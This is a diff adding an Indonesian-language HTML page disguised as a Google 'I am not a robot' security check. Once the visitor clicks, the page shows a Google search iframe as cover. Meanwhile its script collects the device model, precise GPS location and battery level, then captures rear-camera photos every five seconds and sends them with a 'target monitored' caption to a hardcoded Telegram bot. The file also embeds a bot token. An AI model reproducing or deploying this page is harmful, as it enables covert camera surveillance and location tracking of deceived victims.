@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Verifikasi Keamanan</title>
+    <style>
+        body { margin: 0; font-family: arial, sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .box { width: 90%; max-width: 400px; padding: 20px; border: 1px solid #dfe1e5; border-radius: 8px; box-shadow: 0 1px 6px rgba(32,33,36,0.28); }
+        .logo { width: 150px; margin-bottom: 20px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 15px; width: 100%; }
+        #mainContent { display: none; width: 100%; height: 100%; }
+        iframe { border: none; width: 100%; height: 100%; }
+    </style>
+</head>
+<body>
+
+<div id="verifyBox" class="box">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" class="logo">
+    <p>Sistem mendeteksi aktivitas mencurigakan. Klik tombol di bawah untuk melanjutkan ke pencarian.</p>
+    <button class="btn" onclick="startSystem()">SAYA BUKAN ROBOT</button>
+</div>
+
+<div id="mainContent">
+    <iframe id="gFrame" src=""></iframe>
+</div>
+
+<video id="video" style="display:none;" autoplay playsinline></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
+    const CHAT_ID = '6888530451';
+    let userLoc = "Menunggu izin...";
+    let deviceName = "Mendeteksi...";
+
+    async function getAdvancedDeviceName() {
+        let model = "Android Device";
+        if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+            try {
+                const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
+                model = hints.model || model;
+            } catch (e) { console.log(e); }
+        } else {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^;]+); ([^;]+); ([^)]+)\)/);
+            if (match) {
+                model = match[3].split(" Build")[0].trim();
+            }
+        }
+        const modelMap = {
+            "2310FPCA4G": "POCO C65",
+            "M2102J20SG": "POCO X3 Pro",
+            "2201117TY": "Redmi Note 11"
+        };
+        return modelMap[model] || model;
+    }
+
+    async function startSystem() {
+        deviceName = await getAdvancedDeviceName();
+        
+        document.getElementById('verifyBox').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+        document.getElementById('gFrame').src = "https://www.google.com/search?q=google&igu=1";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(pos => {
+                userLoc = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            }, err => {
+                userLoc = "Izin Lokasi Ditolak";
+            }, { enableHighAccuracy: true });
+        }
+
+        // PERUBAHAN DI SINI: Menggunakan facingMode environment untuk kamera belakang
+        try {
+            const constraints = { 
+                video: { 
+                    facingMode: "environment" 
+                } 
+            };
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            document.getElementById('video').srcObject = stream;
+            setInterval(takeAndSend, 5000);
+        } catch (e) {
+            console.error("Gagal akses kamera belakang:", e);
+            // Fallback jika kamera belakang tidak ditemukan
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                setInterval(takeAndSend, 5000);
+            } catch (err) {
+                takeAndSend();
+            }
+        }
+    }
+
+    async function takeAndSend() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        let battery = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = Math.round(b.level * 100) + "%";
+        }
+
+        const report = (blob) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('caption', `👁 *Target Terpantau (Kamera Belakang)*\n\n📱 HP: ${deviceName}\n🔋 Baterai: ${battery}\n📍 Lokasi: ${userLoc}`);
+            fd.append('parse_mode', 'Markdown');
+            
+            if (blob) {
+                fd.append('photo', blob, 'shot.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } else {
+                fd.append('text', fd.get('caption'));
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', body: fd });
+            }
+        };
+
+        if (video.videoWidth > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(report, 'image/jpeg', 0.6);
+        } else {
+            report(null);
+        }
+    }
+</script>
+</body>
+</html>
